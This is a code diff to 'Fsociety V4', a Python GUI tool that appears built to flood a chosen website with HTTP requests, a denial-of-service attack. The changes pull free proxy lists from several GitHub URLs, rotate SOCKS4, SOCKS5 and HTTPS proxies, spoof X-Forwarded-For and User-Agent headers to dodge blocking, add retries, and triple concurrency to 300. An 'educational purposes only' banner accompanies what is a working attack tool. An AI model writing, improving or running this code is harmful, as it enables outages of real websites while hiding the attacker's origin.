@@ -3,6 +3,7 @@ import requests
 import asyncio
 import aiohttp
 import random
+import re
 import itertools
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
@@ -11,12 +12,7 @@ from PyQt5.QtWidgets import (
 from PyQt5.QtGui import QPixmap
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
 from io import BytesIO
-
-try:
-    import aiohttp_socks
-except ImportError:
-    print("Please install aiohttp-socks: pip install aiohttp-socks")
-    sys.exit(1)
+from aiohttp_socks import Socks4Addr, Socks5Addr
 
 # Legal disclaimer
 print("WARNING: This tool is for educational purposes only.")
@@ -56,7 +52,13 @@ UserAgents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0"
 ]
 
-PROXY_LIST_URL = "https://raw.githubusercontent.com/ebrasha/abdal-proxy-hub/refs/heads/main/socks5-proxy-list-by-EbraSha.txt"
+PROXY_LIST_URLS = [
+    ("socks5", "https://raw.githubusercontent.com/ebrasha/abdal-proxy-hub/refs/heads/main/socks5-proxy-list-by-EbraSha.txt"),
+    ("socks4", "https://raw.githubusercontent.com/ebrasha/abdal-proxy-hub/refs/heads/main/socks4-proxy-list-by-EbraSha.txt"),
+    ("https", "https://raw.githubusercontent.com/Vann-Dev/proxy-list/refs/heads/main/proxies/https-tested/tiktok.txt"),
+    ("socks5", "https://raw.githubusercontent.com/gfpcom/free-proxy-list/refs/heads/main/list/socks5.txt"),
+    ("socks5", "https://raw.githubusercontent.com/databay-labs/free-proxy-list/refs/heads/master/socks5.txt"),
+]
 
 class AttackThread(QThread):
     log_signal = pyqtSignal(str)
@@ -68,62 +70,94 @@ class AttackThread(QThread):
         self.target_url = target_url
         self.num_requests = num_requests
         self.is_running = True
+        self.success_count = {"socks4": 0, "socks5": 0, "https": 0}
+        self.failure_count = {"socks4": 0, "socks5": 0, "https": 0}
 
-    async def fetch_proxies(self):
+    async def fetch_proxies(self, url):
         async with aiohttp.ClientSession() as session:
             try:
-                async with session.get(PROXY_LIST_URL, timeout=10) as response:
+                async with session.get(url, timeout=15) as response:
                     if response.status == 200:
                         text = await response.text()
-                        proxies = [line.strip() for line in text.splitlines() if line.strip() and ':' in line]
-                        self.log_signal.emit(f"Fetched {len(proxies)} SOCKS5 proxies.")
+                        proxies = [line.strip() for line in text.splitlines() if line.strip() and re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', line.strip())]
+                        self.log_signal.emit(f"Fetched {len(proxies)} proxies from {url}")
                         return proxies
                     else:
-                        self.log_signal.emit(f"Failed to fetch proxies: Status {response.status}")
+                        self.log_signal.emit(f"Failed to fetch proxies from {url}: Status {response.status}")
                         return []
             except Exception as e:
-                self.log_signal.emit(f"Error fetching proxies: {str(e)}")
+                self.log_signal.emit(f"Error fetching proxies from {url}: {str(e)}")
                 return []
 
-    async def test_proxy(self, session, proxy):
-        try:
-            proxy_url = f"socks5://{proxy}"
-            async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
-                if response.status == 200:
-                    return proxy
-        except Exception:
-            pass
+    async def get_all_proxies(self):
+        tasks = [self.fetch_proxies(url) for _, url in PROXY_LIST_URLS]
+        proxy_lists = await asyncio.gather(*tasks)
+        all_proxies = []
+        for (protocol, url), proxies in zip(PROXY_LIST_URLS, proxy_lists):
+            all_proxies.extend([(proxy, protocol) for proxy in proxies])
+        all_proxies = list(set(all_proxies))  # Deduplicate
+        random.shuffle(all_proxies)
+        self.log_signal.emit(f"Total unique proxies fetched: {len(all_proxies)}")
+        return all_proxies
+
+    async def test_proxy(self, session, proxy, protocol, retries=3):
+        for attempt in range(retries):
+            try:
+                ip, port = proxy.split(':')
+                if protocol == "socks4":
+                    proxy_addr = Socks4Addr(ip, int(port))
+                elif protocol == "socks5":
+                    proxy_addr = Socks5Addr(ip, int(port))
+                else:  # https
+                    proxy_addr = f"http://{ip}:{port}"
+                async with session.get('http://icanhazip.com', proxy=proxy_addr, timeout=10) as response:
+                    if response.status == 200:
+                        return (proxy, protocol)
+            except Exception as e:
+                self.log_signal.emit(f"Proxy test failed for {proxy} ({protocol}, attempt {attempt+1}/{retries}): {str(e)}")
+            await asyncio.sleep(1)
         return None
 
     async def get_working_proxies(self):
-        proxies = await self.fetch_proxies()
-        if not proxies:
+        all_proxies = await self.get_all_proxies()
+        if not all_proxies:
             return []
         async with aiohttp.ClientSession() as session:
-            tasks = [self.test_proxy(session, proxy) for proxy in proxies]
+            tasks = [self.test_proxy(session, proxy, protocol) for proxy, protocol in all_proxies]
             results = await asyncio.gather(*tasks)
             working_proxies = [p for p in results if p is not None]
-            self.log_signal.emit(f"Found {len(working_proxies)} working SOCKS5 proxies.")
+            self.log_signal.emit(f"Validated {len(working_proxies)} working proxies (SOCKS4: {sum(1 for _, p in working_proxies if p == 'socks4')}, SOCKS5: {sum(1 for _, p in working_proxies if p == 'socks5')}, HTTPS: {sum(1 for _, p in working_proxies if p == 'https')})")
             return working_proxies
 
-    async def send_request(self, session, proxy, semaphore):
+    async def send_request(self, session, proxy, protocol, semaphore):
         if not self.is_running:
             return
         async with semaphore:
-            proxy_url = f"socks5://{proxy}"
+            ip, port = proxy.split(':')
+            if protocol == "socks4":
+                proxy_addr = Socks4Addr(ip, int(port))
+            elif protocol == "socks5":
+                proxy_addr = Socks5Addr(ip, int(port))
+            else:  # https
+                proxy_addr = f"http://{ip}:{port}"
             headers = {
                 "User-Agent": random.choice(UserAgents),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.5",
                 "Connection": "keep-alive",
-                "X-Forwarded-For": proxy.split(':')[0],
+                "X-Forwarded-For": ip,
             }
-            try:
-                async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=10) as response:
-                    status = response.status
-                    self.log_signal.emit(f"Attack on {self.target_url} via {proxy} - Status: {status}")
-            except Exception as e:
-                self.log_signal.emit(f"Error sending request via {proxy}: {str(e)}")
+            for attempt in range(3):  # Retry up to 3 times
+                try:
+                    async with session.get(self.target_url, headers=headers, proxy=proxy_addr, timeout=12) as response:
+                        status = response.status
+                        self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
+                        self.success_count[protocol] += 1
+                        return
+                except Exception as e:
+                    self.log_signal.emit(f"Error sending request via {proxy} ({protocol}, attempt {attempt+1}/3): {str(e)}")
+                    await asyncio.sleep(1)
+            self.failure_count[protocol] += 1
 
     async def attack(self):
         working_proxies = await self.get_working_proxies()
@@ -131,21 +165,22 @@ class AttackThread(QThread):
             self.log_signal.emit("No working proxies found. Aborting attack.")
             return
         proxy_cycle = itertools.cycle(working_proxies)
-        semaphore = asyncio.Semaphore(100)
+        semaphore = asyncio.Semaphore(300)  # Increased concurrency
         async with aiohttp.ClientSession() as session:
             tasks = []
             for i in range(self.num_requests):
                 if not self.is_running:
                     break
-                proxy = next(proxy_cycle)
-                tasks.append(self.send_request(session, proxy, semaphore))
-                if len(tasks) >= 100:
+                proxy, protocol = next(proxy_cycle)
+                tasks.append(self.send_request(session, proxy, protocol, semaphore))
+                if len(tasks) >= 300:
                     await asyncio.gather(*tasks)
                     tasks = []
                     self.progress_signal.emit(int((i / self.num_requests) * 100))
             if tasks:
                 await asyncio.gather(*tasks)
             self.progress_signal.emit(100)
+            self.log_signal.emit(f"Attack summary: SOCKS4: {self.success_count['socks4']} success/{self.failure_count['socks4']} failed, SOCKS5: {self.success_count['socks5']} success/{self.failure_count['socks5']} failed, HTTPS: {self.success_count['https']} success/{self.failure_count['https']} failed")
 
     def run(self):
         asyncio.run(self.attack())
@@ -157,7 +192,7 @@ class AttackThread(QThread):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("Fsociety V4 - SOCKS5 Edition")
+        self.setWindowTitle("Fsociety V4 - Multi-Protocol Edition")
         self.setGeometry(200, 200, 600, 600)
         self.setStyleSheet("background-color: #191919; color: white;")
 
